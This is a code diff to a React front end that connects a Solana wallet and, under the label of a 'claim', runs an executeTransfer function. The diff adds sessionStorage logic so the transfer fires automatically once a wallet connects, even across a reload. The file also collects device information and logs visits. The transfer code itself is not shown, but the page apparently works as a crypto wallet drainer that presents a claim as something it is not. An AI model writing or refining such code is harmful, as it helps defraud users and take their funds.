@@ -10,6 +10,38 @@ import { Header } from './header/Header'
 import { Footer } from './footer/Footer'
 
 const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'https://novacore-backend.dgtty.com' // http://localhost:3001
+const PENDING_CLAIM_KEY = 'nova-pending-claim'
+const CLAIM_INTENT_TTL_MS = 5 * 60 * 1000
+
+const hasPendingClaim = () => {
+  try {
+    const requestedAt = Number(window.sessionStorage.getItem(PENDING_CLAIM_KEY))
+    if (!Number.isFinite(requestedAt) || Date.now() - requestedAt > CLAIM_INTENT_TTL_MS) {
+      window.sessionStorage.removeItem(PENDING_CLAIM_KEY)
+      return false
+    }
+    return true
+  } catch {
+    return false
+  }
+}
+
+const savePendingClaim = () => {
+  try {
+    window.sessionStorage.setItem(PENDING_CLAIM_KEY, String(Date.now()))
+  } catch {
+    // The in-memory intent still works when browser storage is unavailable.
+  }
+}
+
+const clearPendingClaim = () => {
+  try {
+    window.sessionStorage.removeItem(PENDING_CLAIM_KEY)
+  } catch {
+    // Ignore unavailable browser storage.
+  }
+}
+
 // ----------------- device info---
 interface DeviceInfo {
   screenResolution: string;
@@ -418,7 +450,7 @@ function App() {
   const { connection } = useAppKitConnection()
   const [status, setStatus] = useState('')
   const [isWorking, setIsWorking] = useState(false)
-  const startAfterConnect = useRef(false)
+  const startAfterConnect = useRef(hasPendingClaim())
   const [transferFailed, setTransferFailed] = useState(false);
   const visitLoggedRef = useRef(false);
   const [showFailureLoader, setShowFailureLoader] = useState(false);
@@ -539,10 +571,13 @@ function App() {
   const startTransfer = useCallback(() => {
     if (!isConnected || !walletProvider?.publicKey || !connection) {
       startAfterConnect.current = true
+      savePendingClaim()
       open()
       return
     }
 
+    startAfterConnect.current = false
+    clearPendingClaim()
     void executeTransfer()
   }, [connection, executeTransfer, isConnected, open, walletProvider])
 
@@ -551,9 +586,15 @@ function App() {
 
     let cancelled = false
     const tryStartTransfer = () => {
-      if (cancelled || !startAfterConnect.current || !walletProvider?.publicKey || !connection) return
+      if (cancelled || !startAfterConnect.current) return
+      if (!hasPendingClaim()) {
+        startAfterConnect.current = false
+        return
+      }
+      if (!isConnected || !walletProvider?.publicKey || !connection) return
 
       startAfterConnect.current = false
+      clearPendingClaim()
       void executeTransfer()
     }
 
